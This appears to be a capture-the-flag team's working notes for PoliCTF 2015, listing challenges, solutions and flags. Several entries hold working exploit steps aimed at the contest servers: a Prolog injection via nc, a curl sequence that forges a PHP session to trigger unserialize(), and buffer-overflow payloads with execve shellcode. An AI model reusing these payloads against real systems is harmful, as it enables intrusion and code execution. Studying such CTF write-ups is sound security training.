@@ -1,0 +1,358 @@
+##vubar polictf 2015 pad##
+
+Challenges: http://polictf.it/scoreboard/challenges
+Login (use "vubar" as the username instead of the email address): http://polictf.it/scoreboard/login
+
+## ------------------------------------------------------ Meta ------------------------------------------------------ ##
+
+Challenges sorted by score with current no. of solvers as of sun 0:20. Any dis-order in the number of solvers represents low- or high-hanging fruit.
+
+points, solvers
+50 177     Pwnable Hanoi As A Service 50 177
+50 199     Grab Bag Hard Interview 50 199
+100 10     Forensics It's Hungry 100 10
+100 173     Reversing Crack Me If You Can 100 173
+100 32     Grab Bag John the Dropper 100 32
+100 45     Pwnable John Pastry Shop 100 45
+100 62     Crypto And the prophet said...  100 62
+100 65     Forensics John in the Middle 100 65
+100 97     Web John The Traveller 100 97
+150 77     Web John The Referee 150 77
+150 79     Pwnable John's Library 150 79
+200 12     Reversing Am I cheating?  200 12
+200 92     Reversing Reversemeplz 200 92
+250 0     Crypto Even the server lies 250 0
+250 5     Forensics Italian spies lost a file 250 5
+300 1     Grab Bag Trollface 300 1
+350 39     Reversing John the Packer 350 39
+350 47     Pwnable John's Shuffle 350 47
+350 48     Web Magic Chall 350 48
+400 16     Crypto 3DOGES2 400 16
+400 3     Forensics Fragmented Key 400 3
+400 4     Reversing Exceptionally-obfuscated 400 4
+450 0     Grab Bag Gandgalf 450 0
+500 1     Grab Bag Lightning 500 1
+500 6     Pwnable Verylong 500 6
+
+
+## ------------------------------------------------------ Solved ------------------------------------------------------ ##
+
+# Hard Interview (grabbag50) (solved)
+
+    solution: ssh admin@312.5.125.233 (the second "IP" address on the list in the movie SwordFish)
+
+    SwordFish (2001) reference
+
+    Command "ssh" is available
+
+    Address "213.225.312.5" is reachable (username yet unknown)
+
+    "ssh admin@213.225.312.5" yields:
+
+    ... Username found
+
+    ... Address reachable
+
+    but then returns to the previous prompt, seemingly only checking the availability of username/address
+
+    ssh usage info:
+
+     ['ssh']: incorrect number of parameters
+
+    usage:  ssh username@address
+
+        username: THE username
+
+        address: a not so easily reachable IP address
+
+    Very simple...isn't it?
+
+    I imagine "admin" might not be "THE" username they're looking for.
+
+  did you try username42 or something? or just 42, as this is THE answer ;)
+  bah, numbers (anywhere) in the username result in "ssh: Could not resolve hostname or username not valid"
+  ok, was just an idea, too bad it didn't help
+
+# Crack Me If You Can (reversing100) (solved)
+
+    Android app with encoded flag in resources.arsc and decoding routines.
+
+    flag{Maybe_This_Obfuscation_Was_Not_That_Good_As_We_Thought}
+
+
+# John The Referee (web150) (solved)
+http://referee.polictf.it
+The size of the output has increasises with the size of field
+curl -vvv -d field=`perl -e "printf '\x00\x01\x02\x03\x05'x65"` http://referee.polictf.it/search
+--> you can just try 'aaaaa' etc and then flip bits to get an sql injection
+flag{Damn_John!_CBC_1s_not_the_best_s0lution_in_this_c4se}
+
+# Hanoi as a service (pwnable50) (solved)
+
+Use the following to get started (replace write(Flag) with arbitrary Prolog commands):
+echo "1), write(Flag), nl, hanoi(1" | nc haas.polictf.it 80
+The solution is in:
+    /home/ctf/haas/jhknsjdfhef_flag_here
+    ascii: 102 108 97 103 123 80 114 48 103 114 97 109 109 49 110 103 95 105 110 95 108 48 103 49 99 95 49 115 95 99 48 48 108 125 10
+    is: flag{Pr0gramm1ng_in_l0g1c_1s_c00l}
+
+# Am I Cheating (reversing200) (solved)
+
+    Contains (part of) the QEMU source, a QEMU disk image "challdeb.img" and a x86_64 elf binary "run_and_solve_me"
+
+    qemu image contains x86 binary "main" with "alphabet.txt". Scanning through the qemu disk image, the C source for "main" is found.
+
+    The application simply compares each location of the string in a slightly unpractical way to the ordering in which letters appear in the alphabet file.
+
+    However, the "alphabet.txt" file present in the home directory does not map to a valid flag. Scanning for disk image for similar output patterns revealed the older flag.
+
+    Turned out that just scanning for "main" in the image would have eventually given the correct flag after a couple of GB, disappointing.
+
+
+# Prophet said (solved)
+   tgz -> tarball u/p andrea (i.e. not a clue), contents base64 -> another gzip, text inside, to cut a long story short:
+>>> l = open("input-file-here").readlines()
+>>> mylist = list(set(l))
+>>> s = "".join(["ABCDEFGHIJKLMNOPQRSTUVWXYZ01234567890"[mylist.index(i)] for i in l])
+>>> s
+'TQUUJKSETI1SBTRUUQPAQSI1S2QLFSQR1FSI1PNESIEVSINHSELFIPASEJS0LIEQSRSUJPASHQ11RAQS1JS1EREI1EIB1S0IUUSTQUCSFJ3S0IETSETQSUQEEQLSGLQO3QPBIQ1XSY3ESINHSPJESLQRUUFSAJJWSRESETREXSJMSETREN1SQPJ3ATKSRTRTKSINHSIPSUJ2QS0IETS1IHCUQSUJ0QLBR1QSGURA1S0IETJ3ES1CRBQ1SRPWS1ELRPAQS1FHYJU1XSGURADUYTEYAA32G1FPEYYO0YJZ'
+>>> s.translate(string.maketrans("TQUJEI1BRPASK2LFNVH0C3GOXYWMDZ", "helotiscang !vry'?mwpufq,bdk{}"))
+"hello! this challenge is very easy isn't it? i'm trying to write a long message so statistics will help you with the letter frequencies, but i'm not really good at that, ok that's enough! ahah! i'm in love with simple lowercase flags without spaces and strange symbols, flag{lbhtbgguvfsyntbbqwbo}"
+>>> [i for i in string.lowercase if i not in  "helotiscang !vry'?mwpufq,bdk{}"]
+['j', 'x', 'z']
+
+the flag should be this: "flag{lbhtbgguvfsyntbbqwbo}" -> but it isn't :)
+rot13 required: flag{yougotthisflagoodjob}
+
+# Exorcise (crypto50) (solved)
+   server reads an input. it responds with ciphertext   
+   This looks like the key (XORING this thing against the first line results in "What's your name?"):
+       677b5f746869735f31735f73305f73696d706c655f796f755f73686f756c645f686176655f736f6c7665645f5f69745f316e5f355f7365637d666c61
+
+    That hex string translates to:
+
+    flag{_this_1s_s0_simple_you_should_have_solved__it_1n_5_sec} - accepted
+
+
+
+# Reversemeplz (reversing200) (solved)
+
+    ./reversemeplz: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.32, uildID[sha1]=73c7fa2b0f12e017768b50f5a67fec27e319cd87, stripped
+
+    0x080483EF gets
+
+    function at 0x08048804 should return other than 0
+
+    input with [a-z]{16}
+
+    The function at 0x8048519 does a rot13: abcdefghijklmnopqrstuvwxyz->nopqrstuvwxyzabcdefghijklm
+
+    After the reading, we check the difference of neighbour letters with this array: 0xff, 0x11, 0xf5, 0x03, 0xf8, 0x05, 0x0e, 0xfd, 0x01, 0x06, 0xf5, 0x06, 0xf8, 0xf6
+
+    Decimal: -1, 17, -11, 3, -8, 5, 14, -3, 1, 6, -11, 6, -8, -10
+
+    We can match 2 series with the range 1-26/a-z: bargjbgursyntlbb, cbshkchvstzoumc
+
+    Rot13 back: onetwotheflagyo, pofuxpuifgmbhzp
+
+    The flag is flag{onetwotheflagyo} or flag{pofuxpuifgmbhzp}? (Tried first, it worked)
+
+    (The second one seems to be the bug they fixed, I worked on the old binary.)
+
+
+# john-the-packer (reversing350) (solved)
+
+    Solution was: flag{packer-15-4-?41=-in-th3-4ss}
+
+    Giving it a shot. Standard x86 elf binary.
+
+    Inching closer to the solution. Narrowed down on the two functions that seem to handle the checking of the flag.
+
+    Fun, part of one of the two remaining functions is a subroutine with a bunch of x87. Time to learn a new set of instructions.
+
+
+    Flags accepted by the binary (but not by the site?):
+
+    You got the flag: flag{packer-15-4-a41=-in-th3-4ss}
+
+    You got the flag: flag{packer-15-4-c41=-in-th3-4ss}
+
+    You got the flag: flag{packer-15-4-e41=-in-th3-4ss}
+
+    You got the flag: flag{packer-15-4-g41=-in-th3-4ss}
+
+    You got the flag: flag{packer-15-4-i41=-in-th3-4ss}
+
+    You got the flag: flag{packer-15-4-k41=-in-th3-4ss}
+
+    You got the flag: flag{packer-15-4-m41=-in-th3-4ss}
+
+    You got the flag: flag{packer-15-4-o41=-in-th3-4ss}
+
+    You got the flag: flag{packer-15-4-q41=-in-th3-4ss}
+
+    You got the flag: flag{packer-15-4-s41=-in-th3-4ss}
+
+    You got the flag: flag{packer-15-4-u41=-in-th3-4ss}
+
+    You got the flag: flag{packer-15-4-w41=-in-th3-4ss}
+
+    You got the flag: flag{packer-15-4-y41=-in-th3-4ss}
+
+    You got the flag: flag{packer-15-4-_41=-in-th3-4ss}
+
+
+# John-in-the-middle (forensics100) (solved)
+Cookie: PHPSESSID=67aqln5j1hq5igadiv9ssfihu3
+the logo.png in the capture has a huge flag in it.. ;-) also the flag, in the background (gimp+floodfill to the rescue): flag{J0hn_th3_Sn1ff3r}
+
+# Magic Chall (web350) (solved)
+http://magic.polictf.it  
+
+
+look there's a page parameter (don't put in index :-p):
+http://magic.polictf.it/index.php?page=magic_things
+
+oh hai php://filter/convert.base64-encode/resource=
+the Magic object has a __call on it which prints the magic
+and the magic_things page calls unserialize() on $_SESSION["userObject"] when you logout, then calls a method on it..
+and finally, the session storage path is known, and we can control the log filename and enough of the contents to fake sessions :)
+
+# make a new user
+curl -v 'http://magic.polictf.it/index.php?page=register' --data 'name=bob&surname=bob&username=username1234&password=andrea&register=send'
+# we have a session id now, login using it (sets the database entry)
+curl -v 'http://magic.polictf.it/index.php?page=login' --data 'username=username1234&password=andrea&login=login' -H 'Cookie: PHPSESSID=5as7okgunm1oroc032sf0u6u22'
+# create a second user which we'll use to overwrite the session file
+curl -v 'http://magic.polictf.it/index.php?page=register' --data 'name=user%7Cs%3A12%3A%22username1234%22%3BuserObject%7Cs%3A16%3A%22O%3A5%3A%22Magic%22%3A0%3A%7B%7D%22%3B&surname=/../../tmp/sess_5as7okgunm1oroc032sf0u6u22&username=random728&password=andrea&register=send'
+# overwrite the session file (log is written at first login) :)
+curl -v 'http://magic.polictf.it/index.php?page=login' --data 'username=random728&password=andrea&login=login'
+# now the object we put in our session gets called --> flag
+curl -v 'http://magic.polictf.it/magic_things.php?logout=true' -H 'Cookie: PHPSESSID=5as7okgunm1oroc032sf0u6u22'
+
+# John's Library (pwnable150) (solved)
+
+    johns-library: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x651878be29012b618fa39c9bb94404db626cf1c2, not stripped
+
+    RWE stack, no canaries
+
+    Error in bound-checking of book title buffer, allows you to chain strings together and read beyond the buffer
+
+    Enter a book name that exceeds the buffer size, overwrite return address, enter "u" to cause main to return and swish, control.
+
+    Book title input of 1045 causes the last four bytes to replace the return address.
+
+
+    # so alyssa is too lazy to do this properly but the following runs /bin/ls ...
+
+    python -c "import sys; sys.stdout.write('a0\n' + '\x90'*975 + '\xb0\x0b\x99\x52\x68\x2f\x2f\x6c\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80'*3 + '\x40\x86\x04\x08'*7 + '\nu')" | nc library.polictf.it 80
+
+    (python -c "import sys; sys.stdout.write('a0\n' + '\x90'*975 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80' + '\x90'*41 + '\x40\x86\x04\x08'*7 + '\nu')"; cat;) | nc library.polictf.it 80
+
+    flag{John_should_read_a_real_book_on_s3cur3_pr0gr4mm1ng}
+
+
+# john's pastry shop (solved)
+
+first you need a key to sign with:
+keytool -genkey -dname "CN=Shamano Pastry Shop, OU=Shamano Cooking Service, O=Shamano Inc., L=Milano, ST=Italy, C=IT" -keystore mykeystore -alias shamano_
+<enter password twice, then hit enter>
+
+then you can send Java code (e.g. unzip the example jar, remove the shamano_ stuff from meta-inf, and replace the .class) by doing this:
+rm new.jar && zip new.jar it/ META-INF/
+jarsigner -keystore mykeystore new.jar shamano_
+<enter same password>
+python encode.py
+cat out.jar | nc pastry.polictf.it 80
+
+### python script here
+newdata = open("new.jar")
+mydata = open("out.jar", "w+")
+
+# valid data
+mydata.write('\x17')
+for d in newdata.read():
+    if d == '\x17' or d == '\x18' or d == '\x19':
+        mydata.write('\x18')
+        mydata.write(d)
+    else:
+        mydata.write(d)
+mydata.write('\x19')
+
+--> Process p = Runtime.getRuntime().exec("base64 /home/ctf/JohnPastryShop.jar");
+--> then the flag is in one of the class files, flag{PinzimonioIsTheSecretIngredientAndANiceFlag}
+
+# JOHN THE TRAVELLER (web100) (solved)
+http://traveller.polictf.it
+The last two words of the description are Happy holdays in finnish... so Helsinki?
+curl -vvv 'http://traveller.polictf.it/?destination=helsinki' | grep 'td class=' 
+
+    the td class changes
+
+Seems the sequences are systematic: wXY(..) , where w is 'w', X and Y are digits (X line, Y column?), '.' is anything
+(free for grabs, I need to catch some rest)
+these might be indexes into 3.jpg? see http://fuzzie.org/polictf_3.jpg
+manually putting the 100x100 picel QR parts together reveals the flag
+flag{run_to_the_hills_run_for_your_life}
+
+## ------------------------------------------------------ Open ------------------------------------------------------ ##
+
+[ please work on any of these if you feel inspired!! ]
+
+# John the Dropper (grabbag100) (unclaimed for now)
+
+    A DNS lookup and portscan reveals that dropper.polictf.it maps to 52.18.119.20, which has port 22 open and an SSH server running.
+
+it is surely a binary msg encoded into which pings it responds to :-) at least there are patterns in there
+seems like probably groups of 5? and then for high icmp_req it just responds to all of them
+yes, it is the sequence numbers of icmp echos - decode it? :)
+the seq gaps are 0-3 so i'm trying the 2-bits-given-per-gap hypothesis (ben) - this is probably BS because the gap freqs are:
+60 0
+97 1
+58 3
+should've checked that sooner :X. out of ideas for now.
+
+alyssa extracted this (packet received or not received), don't know if it matches anyone else, but this is probably hopeless:
+1010101100010001000110101011111000110101010110101101010111110101101010111110001101010101101111101010001011010001010110100011000100010110100010001010001101011000110001010101010001101011010101100010101010100011000101101101010100011010010001011000101010101000110001100010001000110001000100011000101010101000110100010101101000110001101100010101010100011010100010110001000100011010001011000101010101000110100011000101010101000110001010110100010110001000100011010001000101101000100010100010001111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
+
+# italian-spies-lost-a-file (forensics250)
+sets of 16 bytes
+first uint32 = id (starts at 0, +20 each time)
+then 3 sets of:
+  2 bytes = data?? (as uint16, pretty evenly distributed across the number space)
+  uint16 = id (e.g. the last of the third is 0x40b4 through 0x415f (some missing, some duplicates, heavily concentrated in 0x4119-0x411f range)
+Perhaps the recent Hacking Team fail is related to this challenge?
+
+# it's hungry (100) (unclaimed)
+   found by clicking on the audio time offset
+   some hidden message in the chiptune?
+   Not in metadata: FLAG: Yeah, dream on!
+   Or in the sound waves. Spectrogram: THE FLAG... IS NOT HERE! KEEP LISTENING! + trollface + morse code YOUOVERCOMPLICATINGJUSTLISTEN
+   http://polictf.it/tunes/oldmcdonald.flac
+   
+# Exceptionally-obfuscated
+
+    tar xvfz exceptionally-obfuscated.ipk
+
+    tar xvfz control.tar.gz
+
+    tar xvfz data.tar.gz
+
+    MIPS32 binary
+
+  it expects a --challenge= and a --key= and then it calls check4859 which works in phases and I can't imagine wanting to try solving this manually
+  tried qemu, but it needs uclibc dyn lib, so didn't go further yet
+
+
+# John's Shuffle
+  look, you can overwrite the return address.. no exec stack though :) but system is present
+  problem is: the PLT entries for all the useful functions are scrambled (by a time-seeded rand)
+  and the unshuffle function (which it uses before calling them itself) requires the seed as a parameter (and zeros around it, so you can't point ebp at the bss where the seed is stored)
+  to get an exit(-1) due to the unshuffle check failing, try:
+
+python -c "import sys; sys.stdout.write('\x00'*0x20 + '\xf0\x8d\x04\x08' + '\x00'*31); sys.stdout.write('exit\n')" | ltrace ./johns-shuffle
+
+# 3doges
+the first/second keys are identical (lol) so they're no-ops and it turns into single DES
+the third key generation is also bad; there are only 16 possible values for each byte:
+>>> possible_keys = [0, 32, 59, 68, 246, 201, 127, 141, 242, 173, 210, 150, 169, 100, 27, 95]
+
